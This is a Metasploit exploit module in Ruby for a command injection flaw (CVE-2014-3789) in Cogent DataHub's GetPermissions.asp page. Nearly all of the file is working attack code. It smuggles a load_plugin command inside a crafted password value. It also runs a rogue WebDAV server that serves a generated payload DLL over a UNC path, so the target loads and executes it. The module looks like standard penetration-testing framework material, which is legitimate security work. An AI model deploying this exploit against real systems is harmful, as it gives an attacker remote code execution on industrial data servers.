##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  # Exploitation is reliable, but the service hangs and needs manual restarting.
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize
    super(
      'Name'        	=> 'Cogent DataHub Command Injection',
      'Description'   => %q{
        This module exploits an injection vulnerability in Cogent DataHub prior
        to 7.3.5. The vulnerability exists in the GetPermissions.asp page, which
        makes insecure use of the datahub_command function with user controlled
        data, allowing execution of arbitrary datahub commands and scripts. This
        module has been tested successfully with Cogent DataHub 7.3.4 on
        Windows 7 SP1. Please also note that after exploitation, the remote service
        will most likely hang and restart manually.
      },
      'Author'      => [
        'John Leitch', # Vulnerability discovery
        'juan vazquez' # Metasploit module
      ],
      'Platform'    => 'win',
      'References'  =>
        [
          ['ZDI', '14-136'],
          ['CVE', '2014-3789'],
          ['BID', '67486']
        ],
      'Stance'      => Msf::Exploit::Stance::Aggressive,
      'DefaultOptions' => {
        'WfsDelay' => 30,
        'InitialAutoRunScript' => 'migrate -f'
      },
      'Targets'     =>
        [
          [ 'Cogent DataHub < 7.3.5', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 29 2014'
    )
    register_options(
      [
        OptString.new('URIPATH',   [ true,  'The URI to use (do not change)', '/']),
        OptPort.new('SRVPORT',     [ true,  'The daemon port to listen on ' +
                                                      '(do not change)', 80 ]),
        OptInt.new('WEBDAV_DELAY', [ true,  'Time that the HTTP Server will ' +
                                          'wait for the payload request', 20]),
        OptString.new('UNCPATH',   [ false, 'Override the UNC path to use.' ])
      ], self.class)
  end

  def autofilter
    false
  end

  def on_request_uri(cli, request)
    case request.method
      when 'OPTIONS'
        process_options(cli, request)
      when 'PROPFIND'
        process_propfind(cli, request)
      when 'GET'
        process_get(cli, request)
      else
        vprint_status("#{request.method} => 404 (#{request.uri})")
        resp = create_response(404, "Not Found")
        resp.body = ""
        resp['Content-Type'] = 'text/html'
        cli.send_response(resp)
    end
  end

  def process_get(cli, request)

    if blacklisted_path?(request.uri)
      vprint_status("GET => 404 [BLACKLIST] (#{request.uri})")
      resp = create_response(404, "Not Found")
      resp.body = ""
      cli.send_response(resp)
      return
    end

    if request.uri.include?(@basename)
      print_status("GET => Payload")
      return if ((p = regenerate_payload(cli)) == nil)
      data = generate_payload_dll({ :code => p.encoded })
      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
      return
    end

    # Treat index.html specially
    if (request.uri[-1,1] == "/" or request.uri =~ /index\.html?$/i)
      vprint_status("GET => REDIRECT (#{request.uri})")
      resp = create_response(200, "OK")

      resp.body  = %Q|<html><head><meta http-equiv="refresh" content="0;URL=|
      resp.body += %Q|#{@exploit_unc}#{@share_name}\\"></head><body></body></html>|
      resp['Content-Type'] = 'text/html'
      cli.send_response(resp)
      return
    end

    # Anything else is probably a request for a data file...
    vprint_status("GET => DATA (#{request.uri})")
    data = rand_text_alpha(4 + rand(4))
    send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
  end

  #
  # OPTIONS requests sent by the WebDav Mini-Redirector
  #
  def process_options(cli, request)
    vprint_status("OPTIONS #{request.uri}")
    headers = {
      'MS-Author-Via' => 'DAV',
      'DASL'          => '<DAV:sql>',
      'DAV'           => '1, 2',
      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY,' +
                    + ' MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, ' +
                    + 'LOCK, UNLOCK',
      'Cache-Control' => 'private'
    }
    resp = create_response(207, "Multi-Status")
    headers.each_pair {|k,v| resp[k] = v }
    resp.body = ""
    resp['Content-Type'] = 'text/xml'
    cli.send_response(resp)
  end

  #
  # PROPFIND requests sent by the WebDav Mini-Redirector
  #
  def process_propfind(cli, request)
    path = request.uri
    vprint_status("PROPFIND #{path}")

    if path !~ /\/$/

      if blacklisted_path?(path)
        vprint_status "PROPFIND => 404 (#{path})"
        resp = create_response(404, "Not Found")
        resp.body = ""
        cli.send_response(resp)
        return
      end

      if path.index(".")
        vprint_status "PROPFIND => 207 File (#{path})"
        body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
        # send the response
        resp = create_response(207, "Multi-Status")
        resp.body = body
        resp['Content-Type'] = 'text/xml; charset="utf8"'
        cli.send_response(resp)
        return
      else
        vprint_status "PROPFIND => 301 (#{path})"
        resp = create_response(301, "Moved")
        resp["Location"] = path + "/"
        resp['Content-Type'] = 'text/html'
        cli.send_response(resp)
        return
      end
    end

    vprint_status "PROPFIND => 207 Directory (#{path})"
    body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
  <D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
    <D:href>#{path}</D:href>
    <D:propstat>
      <D:prop>
        <lp1:resourcetype><D:collection/></lp1:resourcetype>
        <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
        <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
        <lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
        <D:supportedlock>
          <D:lockentry>
            <D:lockscope><D:exclusive/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
          </D:lockentry>
          <D:lockentry>
            <D:lockscope><D:shared/></D:lockscope>
            <D:locktype><D:write/></D:locktype>
          </D:lockentry>
        </D:supportedlock>
        <D:lockdiscovery/>
        <D:getcontenttype>httpd/unix-directory</D:getcontenttype>
      </D:prop>
    <D:status>HTTP/1.1 200 OK</D:status>
  </D:propstat>
</D:response>
|

    if request["Depth"].to_i > 0
      trail = path.split("/")
      trail.shift
      case trail.length
        when 0
          body << generate_shares(path)
        when 1
          body << generate_files(path)
      end
    else
      vprint_status "PROPFIND => 207 Top-Level Directory"
    end

    body << "</D:multistatus>"

    body.gsub!(/\t/, '')

    # send the response
    resp = create_response(207, "Multi-Status")
    resp.body = body
    resp['Content-Type'] = 'text/xml; charset="utf8"'
    cli.send_response(resp)
  end

  def generate_shares(path)
    share_name = @share_name
    %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{share_name}/</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
  end

  def generate_files(path)
    trail = path.split("/")
    return "" if trail.length < 2

    base  = @basename
    exts  = @extensions.gsub(",", " ").split(/\s+/)
    files = ""
    exts.each do |ext|
      files << %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{base}.#{ext}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
<D:ishidden b:dt="boolean">1</D:ishidden>
</D:propstat>
</D:response>
|
    end

    files
  end

  def gen_timestamp(ttype=nil)
    ::Time.now.strftime("%a, %d %b %Y %H:%M:%S GMT")
  end

  def gen_datestamp(ttype=nil)
    ::Time.now.strftime("%Y-%m-%dT%H:%M:%SZ")
  end

  # This method rejects requests that are known to break exploitation
  def blacklisted_path?(uri)
    share_path = "/#{@share_name}"
    payload_path = "#{share_path}/#{@basename}.dll"
    case uri
      when payload_path
        return false
      when share_path
        return false
      else
        return true
    end
  end

  def check
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri('/', 'Silverlight', 'GetPermissions.asp'),
      'vars_post' =>
        {
          'username' => rand_text_alpha(4 + rand(4)),
          'password' => rand_text_alpha(4 + rand(4))
        }
      })

    if res && res.code == 200 && res.body =~ /PermissionRecord/
        return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def send_injection(dll)
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri('/', 'Silverlight', 'GetPermissions.asp'),
      'vars_post' =>
        {
          'username' => rand_text_alpha(3 + rand(3)),
          'password' => "#{rand_text_alpha(3 + rand(3))}\")" +
                        "(load_plugin \"#{dll}\" 1)(\""
        }
      }, 1)

    res
  end

  def on_new_session(session)
    if service
      service.stop
    end

    super
  end

  def primer
    print_status("Sending injection...")
    res = send_injection("\\\\\\\\#{@myhost}\\\\#{@share_name}\\\\#{@basename}.dll")
    if res
      print_error("Unexpected answer")
    end
  end

  def exploit
    if datastore['UNCPATH'].blank?
      @basename = rand_text_alpha(3)
      @share_name = rand_text_alpha(3)
      @extensions = "dll"
      @system_commands_file = rand_text_alpha_lower(4)

      if (datastore['SRVHOST'] == '0.0.0.0')
        @myhost = Rex::Socket.source_address('50.50.50.50')
      else
        @myhost = datastore['SRVHOST']
      end

      @exploit_unc  = "\\\\#{@myhost}\\"

      if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
        fail_with(Failure::BadConfig, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')
      end

      print_status("Starting Shared resource at #{@exploit_unc}#{@share_name}" +
                    "\\#{@basename}.dll")

      begin
        # The Windows Webclient needs some time...
        Timeout.timeout(datastore['WEBDAV_DELAY']) { super }
      rescue ::Timeout::Error
        service.stop if service
      end
    else
      # Using external SMB Server
      if datastore['UNCPATH'] =~ /\\\\([^\\]*)\\([^\\]*)\\([^\\]*\.dll)/
        host = $1
        share_name = $2
        dll_name = $3
        print_status("Sending injection...")
        res = send_injection("\\\\\\\\#{host}\\\\#{share_name}\\\\#{dll_name}")
        if res
          print_error("Unexpected answer")
        end
      else
        fail_with(Failure::BadConfig, 'Bad UNCPATH format, should be \\\\host\\shared_folder\\base_name.dll')
      end
    end
  end

end